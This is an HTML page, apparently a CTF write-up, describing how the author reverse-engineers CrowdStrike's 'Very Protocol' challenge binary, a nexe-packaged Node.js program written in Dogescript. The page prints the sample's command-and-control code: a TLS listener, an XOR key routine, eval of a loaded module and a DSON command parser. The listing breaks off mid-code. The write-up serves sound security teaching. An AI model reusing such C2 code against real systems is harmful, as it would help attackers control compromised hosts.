@@ -1,0 +1,1827 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <meta name="author" content="Joe Ammond (pugpug)">
+      
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.3">
+    
+    
+      
+        <title>Catapult Spider - Very Protocol - CrowdStrike Adversary Quest CTF writeup</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.3b61ea93.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.39b8e14a.min.css">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+      <link rel="stylesheet" href="../../css/print.css">
+    
+    
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="none" data-md-color-accent="none">
+      
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#catapult-spider-very-protocol" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="../.." title="CrowdStrike Adversary Quest CTF writeup" class="md-header-nav__button md-logo" aria-label="CrowdStrike Adversary Quest CTF writeup">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      <div class="md-header-nav__ellipsis">
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            CrowdStrike Adversary Quest CTF writeup
+          </span>
+        </div>
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            
+              Catapult Spider - Very Protocol
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="CrowdStrike Adversary Quest CTF writeup" class="md-nav__button md-logo" aria-label="CrowdStrike Adversary Quest CTF writeup">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    CrowdStrike Adversary Quest CTF writeup
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="http://ammond.org" class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../.." class="md-nav__link">
+      Introduction
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../SpaceJackal/the-proclamation/" class="md-nav__link">
+      Space Jackal - The Proclamation
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../SpaceJackal/matrix/" class="md-nav__link">
+      Space Jackal - Matrix
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../SpaceJackal/injector/" class="md-nav__link">
+      Space Jackal - Injector
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../muchsad/" class="md-nav__link">
+      Catapult Spider - Much Sad
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Catapult Spider - Very Protocol
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+    
+    <a href="./" class="md-nav__link md-nav__link--active">
+      Catapult Spider - Very Protocol
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#challenge-description" class="md-nav__link">
+    Challenge description
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    Solution
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#answer" class="md-nav__link">
+    Answer
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../conclusion/" class="md-nav__link">
+      Conclusion
+    </a>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#challenge-description" class="md-nav__link">
+    Challenge description
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    Solution
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#answer" class="md-nav__link">
+    Answer
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset"><a class="md-content__button md-icon" download href="veryprotocol.pdf" title="PDF Export"><svg style="height: 1.2rem; width: 1.2rem;" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M224 136V0H24C10.7 0 0 10.7 0 24v464c0 13.3 10.7 24 24 24h336c13.3 0 24-10.7 24-24V160H248c-13.2 0-24-10.8-24-24zm76.45 211.36l-96.42 95.7c-6.65 6.61-17.39 6.61-24.04 0l-96.42-95.7C73.42 337.29 80.54 320 94.82 320H160v-80c0-8.84 7.16-16 16-16h32c8.84 0 16 7.16 16 16v80h65.18c14.28 0 21.4 17.29 11.27 27.36zM377 105L279.1 7c-4.5-4.5-10.6-7-17-7H256v128h128v-6.1c0-6.3-2.5-12.4-7-16.9z"></path></svg></a>
+              
+                
+                
+                <h1 id="catapult-spider-very-protocol">CATAPULT SPIDER - Very Protocol<a class="headerlink" href="#catapult-spider-very-protocol" title="Permanent link">#</a></h1>
+<p>We now have a copy of CATAPULT SPIDER's malware. Our task is to reverse engineer the 
+protocol and retrieve the encryption key from the malware server. We're going down the
+Doge rabbit hole.</p>
+<h2 id="challenge-description">Challenge description<a class="headerlink" href="#challenge-description" title="Permanent link">#</a></h2>
+<p><img alt="Very Protocol" src="../../img/veryprotocol/00.png" /></p>
+<blockquote>
+<p>We were approached by a CATAPULT SPIDER victim that was compromised and had all their cat pictures encrypted. Employee morale dropped to an all-time low. We believe that we identified a <a href="https://adversaryquest-static.s3.amazonaws.com/CuchSewdAnwanAff/malware">binary file</a> that is related to the incident and is still running in the customer environment, accepting command and control traffic on</p>
+<p><code>veryprotocol.challenges.adversary.zone:41414</code></p>
+<p>Can you help the customer recover the encryption key?</p>
+</blockquote>
+<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">#</a></h2>
+<p>Downloading the malware file, we see it's a farily large Linux binary:</p>
+<div class="highlight"><pre><span></span><code><span class="go">xps15$ ls -l malware</span>
+<span class="go">-rwxr-xr-x 1 jra jra 48073657 Jan 20 07:41 malware*</span>
+<span class="go">xps15$ file malware</span>
+<span class="go">malware: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=101536e3a95f4d38ffb8627533070d093d1ee165, with debug_info, not stripped</span>
+</code></pre></div>
+<p>Running <code>strings</code> on the binary reveals the file contains much JavaScript code. The
+last string returned is <code>&lt;nexe~~sentinel&gt;</code>, which gives us a clue as to how the
+binary was built. <a href="https://github.com/nexe/nexe">nexe</a> is a tool that packages
+<a href="https://nodejs.org/en/">Node.js</a> files into a single executable for easy distrbution. </p>
+<p>Digging through the file with an editor such as <code>vi</code>, we can laboriously look through all 
+of the JavaScript files embedded in the malware. One chunk, however, jumps out as suspicious:
+it's not JavaScript, but a language known as <a href="https://dogescript.io/">dogescript</a> (of course).</p>
+<p>Pulling out the Dogescript files, we see that this is the main program of the malware (trimmed
+for length):</p>
+<div class="highlight"><pre><span></span><code><span class="nx">so</span> <span class="nx">tls</span> <span class="nx">as</span> <span class="nx">tls</span>
+<span class="nx">so</span> <span class="nx">fs</span> <span class="nx">as</span> <span class="nx">fs</span>
+<span class="nx">so</span> <span class="nx">dogeon</span> <span class="nx">as</span> <span class="nx">dson</span>
+<span class="nx">so</span> <span class="nx">dogescript</span> <span class="nx">as</span> <span class="nx">dogescript</span>
+<span class="nx">so</span> <span class="p">.</span><span class="o">/</span><span class="nx">muchmysterious</span> <span class="nx">as</span> <span class="nx">mysterious</span>
+<span class="nx">so</span> <span class="nx">child_process</span> <span class="nx">as</span> <span class="nx">cp</span>
+
+<span class="nx">very</span> <span class="nx">cript_key</span> <span class="nx">is</span> <span class="nx">plz</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span> <span class="kd">with</span> <span class="o">&amp;</span>
+<span class="nx">dose</span> <span class="nx">toString</span> <span class="kd">with</span> <span class="mf">36</span><span class="o">&amp;</span>
+<span class="nx">dose</span> <span class="nx">substr</span> <span class="kd">with</span> <span class="mf">2</span> <span class="mf">15</span>
+
+<span class="nx">rly</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">CRYPTZ</span> <span class="nx">is</span> <span class="kc">undefined</span>
+  <span class="nx">plz</span> <span class="nx">console</span><span class="p">.</span><span class="nx">loge</span> <span class="kd">with</span> <span class="s1">&#39;no cryptz key. doge can not crypt catz.&#39;</span>
+  <span class="nx">process</span> <span class="nx">dose</span> <span class="nx">exit</span> <span class="kd">with</span> <span class="mf">1</span>
+<span class="nx">wow</span>
+<span class="nx">very</span> <span class="nx">secrit_key</span> <span class="o">=</span> <span class="nx">plz</span> <span class="nx">cript</span> <span class="kd">with</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">CRYPTZ</span> <span class="nx">cript_key</span>
+<span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">CRYPTZ</span> <span class="nx">is</span> <span class="s1">&#39;you dnt git key&#39;</span>
+<span class="k">delete</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">CRYPTZ</span> <span class="nx">next</span>
+
+<span class="nx">networker_file</span> <span class="nx">is</span> <span class="nx">fs</span> <span class="nx">dose</span> <span class="nx">readFileSync</span> <span class="kd">with</span> <span class="s1">&#39;./networker.djs&#39;</span><span class="o">&amp;</span>
+<span class="nx">dose</span> <span class="nx">toString</span> <span class="kd">with</span> <span class="s1">&#39;utf-8&#39;</span>
+<span class="nx">very</span> <span class="nx">networker_doge</span> <span class="nx">is</span> <span class="nx">plz</span> <span class="nx">dogescript</span> <span class="kd">with</span> <span class="nx">networker_file</span>
+<span class="nx">very</span> <span class="nx">Networker</span> <span class="nx">is</span> <span class="nx">plz</span> <span class="nb">eval</span> <span class="kd">with</span> <span class="nx">networker_doge</span>
+
+<span class="p">...</span> <span class="p">(</span><span class="nx">much</span> <span class="nx">code</span><span class="p">.</span> <span class="nx">such</span> <span class="nx">doge</span><span class="p">.</span> <span class="nx">wow</span><span class="p">)</span>
+
+<span class="kr">const</span> <span class="nx">server</span> <span class="o">=</span> <span class="nx">tls</span><span class="p">.</span><span class="nx">createServer</span><span class="p">(</span><span class="nx">options</span><span class="p">,</span> <span class="p">(</span><span class="nx">socket</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;doge connected: &#39;</span><span class="p">,</span>
+              <span class="nx">socket</span><span class="p">.</span><span class="nx">authorized</span> <span class="o">?</span> <span class="s1">&#39;TOP doge&#39;</span> <span class="o">:</span> <span class="s1">&#39;not top doge&#39;</span><span class="p">);</span>
+  <span class="kd">let</span> <span class="nx">networker</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Networker</span><span class="p">(</span><span class="nx">socket</span><span class="p">,</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">very</span> <span class="nx">doge_lingo</span> <span class="nx">is</span> <span class="nx">data</span> <span class="nx">dose</span> <span class="nx">toString</span>
+        <span class="nx">plz</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span>  <span class="kd">with</span> <span class="s1">&#39;top doge sez:&#39;</span> <span class="nx">doge_lingo</span>
+    <span class="nx">very</span> <span class="nx">doge_woof</span> <span class="nx">is</span> <span class="nx">plz</span> <span class="nx">dogeParam</span> <span class="kd">with</span> <span class="nx">doge_lingo</span>
+    <span class="nx">networker</span> <span class="nx">dose</span> <span class="nx">send</span> <span class="kd">with</span> <span class="nx">doge_woof</span>
+      <span class="nx">networker</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">dogeParam</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">toString</span><span class="p">()));</span>
+  <span class="p">});</span>
+<span class="c1">//networker dose init with &#39;such doge is yes wow&#39; &#39;such doge is shibe wow&#39;</span>
+<span class="p">});</span>
+<span class="nx">server</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mf">41414</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+  <span class="nx">plz</span> <span class="nx">console</span><span class="p">.</span><span class="nx">loge</span> <span class="kd">with</span> <span class="s1">&#39;doge waiting for command from top doge&#39;</span>
+<span class="p">});</span>
+<span class="nx">server</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;connection&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">plz</span> <span class="nx">console</span><span class="p">.</span><span class="nx">loge</span> <span class="kd">with</span> <span class="s1">&#39;doge connect&#39;</span>
+<span class="p">});</span>
+<span class="nx">server</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;secureConnect&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">plz</span> <span class="nx">console</span><span class="p">.</span><span class="nx">loge</span> <span class="kd">with</span> <span class="s1">&#39;doge connect secure&#39;</span>
+<span class="p">});</span>
+</code></pre></div>
+<p>And a module for the network protocol:</p>
+<div class="highlight"><pre><span></span><code><span class="nx">so</span> <span class="nx">crypto</span> <span class="nx">as</span> <span class="nx">crypto</span>
+
+<span class="nx">classy</span> <span class="nx">Networker</span>
+
+    <span class="nx">maker</span> <span class="nx">socket</span> <span class="nx">handler</span>
+      <span class="nx">dis</span> <span class="nx">giv</span> <span class="nx">socket</span> <span class="nx">is</span> <span class="nx">socket</span>
+      <span class="nx">dis</span> <span class="nx">giv</span> <span class="nx">_packet</span> <span class="nx">is</span> <span class="p">{}</span>
+      <span class="nx">dis</span> <span class="nx">giv</span> <span class="nx">_process</span> <span class="nx">is</span> <span class="kc">false</span>
+      <span class="nx">dis</span> <span class="nx">giv</span> <span class="nx">_state</span> <span class="nx">is</span> <span class="s1">&#39;HEADER&#39;</span>
+      <span class="nx">dis</span> <span class="nx">giv</span> <span class="nx">_payloadLength</span> <span class="nx">is</span> <span class="mf">0</span>
+      <span class="nx">dis</span> <span class="nx">giv</span> <span class="nx">_bufferedBytes</span> <span class="nx">is</span> <span class="mf">0</span>
+      <span class="nx">dis</span> <span class="nx">giv</span> <span class="nx">queue</span> <span class="nx">is</span> <span class="p">[]</span>
+      <span class="nx">dis</span> <span class="nx">giv</span> <span class="nx">handler</span> <span class="nx">is</span> <span class="nx">handler</span>
+    <span class="nx">wow</span>
+    <span class="nx">next</span>
+
+<span class="p">...</span> <span class="p">(</span><span class="nx">more</span> <span class="nx">code</span><span class="p">.</span> <span class="nx">shibe</span> <span class="nx">good</span> <span class="nx">boi</span><span class="p">.)</span>
+
+    <span class="nx">_send</span><span class="p">(){</span>
+      <span class="nx">very</span> <span class="nx">contentLength</span> <span class="nx">is</span> <span class="nx">plz</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">allocUnsafe</span> <span class="kd">with</span> <span class="mf">4</span>
+      <span class="nx">plz</span> <span class="nx">contentLength</span><span class="p">.</span><span class="nx">writeUInt32BE</span> <span class="kd">with</span> <span class="k">this</span><span class="p">.</span><span class="nx">_packet</span><span class="p">.</span><span class="nx">header</span><span class="p">.</span><span class="nx">length</span>
+      <span class="nx">plz</span> <span class="k">this</span><span class="p">.</span><span class="nx">socket</span><span class="p">.</span><span class="nx">write</span> <span class="kd">with</span> <span class="nx">contentLength</span>
+      <span class="nx">plz</span> <span class="k">this</span><span class="p">.</span><span class="nx">socket</span><span class="p">.</span><span class="nx">write</span> <span class="kd">with</span> <span class="k">this</span><span class="p">.</span><span class="nx">_packet</span><span class="p">.</span><span class="nx">message</span>
+      <span class="k">this</span><span class="p">.</span><span class="nx">_packet</span> <span class="nx">is</span> <span class="p">{}</span>
+    <span class="p">}</span>
+    <span class="nx">next</span>
+<span class="nx">wow</span>
+
+<span class="nx">woof</span> <span class="nx">Networker</span>
+</code></pre></div>
+<p>Thankfully, we don't have to learn Dogescript to reverse engineer the malware. An <a href="https://dogescript.io/live/">online
+translator</a> is available that will turn this into actual JavaScript.
+Running the Dogescript files through the translator provides more readable code:</p>
+<p>Main program
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>  1
+  2
+  3
+  4
+  5
+  6
+  7
+  8
+  9
+ 10
+ 11
+ 12
+ 13
+ 14
+ 15
+ 16
+ 17
+ 18
+ 19
+ 20
+ 21
+ 22
+ 23
+ 24
+ 25
+ 26
+ 27
+ 28
+ 29
+ 30
+ 31
+ 32
+ 33
+ 34
+ 35
+ 36
+ 37
+ 38
+ 39
+ 40
+ 41
+ 42
+ 43
+ 44
+ 45
+ 46
+ 47
+ 48
+ 49
+ 50
+ 51
+ 52
+ 53
+ 54
+ 55
+ 56
+ 57
+ 58
+ 59
+ 60
+ 61
+ 62
+ 63
+ 64
+ 65
+ 66
+ 67
+ 68
+ 69
+ 70
+ 71
+ 72
+ 73
+ 74
+ 75
+ 76
+ 77
+ 78
+ 79
+ 80
+ 81
+ 82
+ 83
+ 84
+ 85
+ 86
+ 87
+ 88
+ 89
+ 90
+ 91
+ 92
+ 93
+ 94
+ 95
+ 96
+ 97
+ 98
+ 99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="kd">var</span> <span class="nx">tls</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;tls&#39;</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">dson</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;dogeon&#39;</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">dogescript</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;dogescript&#39;</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">mysterious</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;./muchmysterious&#39;</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">cp</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">);</span>
+
+<span class="kd">var</span> <span class="nx">cript_key</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span>
+    <span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mf">36</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mf">2</span><span class="p">,</span> <span class="mf">15</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">CRYPTZ</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;no cryptz key. doge can not crypt catz.&#39;</span><span class="p">);</span>
+    <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="mf">1</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kd">var</span> <span class="nx">secrit_key</span> <span class="o">=</span> <span class="nx">cript</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">CRYPTZ</span><span class="p">,</span> <span class="nx">cript_key</span><span class="p">);</span>
+<span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">CRYPTZ</span> <span class="o">=</span> <span class="s1">&#39;you dnt git key&#39;</span><span class="p">;</span>
+<span class="k">delete</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">CRYPTZ</span><span class="p">;</span>
+<span class="nx">networker_file</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;./networker.djs&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">networker_doge</span> <span class="o">=</span> <span class="nx">dogescript</span><span class="p">(</span><span class="nx">networker_file</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">Networker</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="nx">networker_doge</span><span class="p">);</span>
+
+<span class="kd">function</span> <span class="nx">cript</span><span class="p">(</span><span class="nx">input</span><span class="p">,</span> <span class="nx">key</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">alloc</span><span class="p">(</span><span class="nx">input</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+    <span class="k">while</span> <span class="p">(</span><span class="nx">key</span><span class="p">.</span><span class="nx">length</span> <span class="o">&lt;</span> <span class="nx">input</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">key</span> <span class="o">+=</span> <span class="nx">key</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="kd">var</span> <span class="nx">ib</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">input</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">kb</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">key</span><span class="p">);</span>
+    <span class="k">for</span> <span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mf">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">input</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">c</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ib</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">^</span> <span class="nx">kb</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">dogeParam</span><span class="p">(</span><span class="nx">buffer</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">doge_command</span> <span class="o">=</span> <span class="nx">dson</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">buffer</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">doge_response</span> <span class="o">=</span> <span class="p">{};</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="s1">&#39;dogesez&#39;</span> <span class="k">in</span> <span class="nx">doge_command</span><span class="p">))</span> <span class="p">{</span>
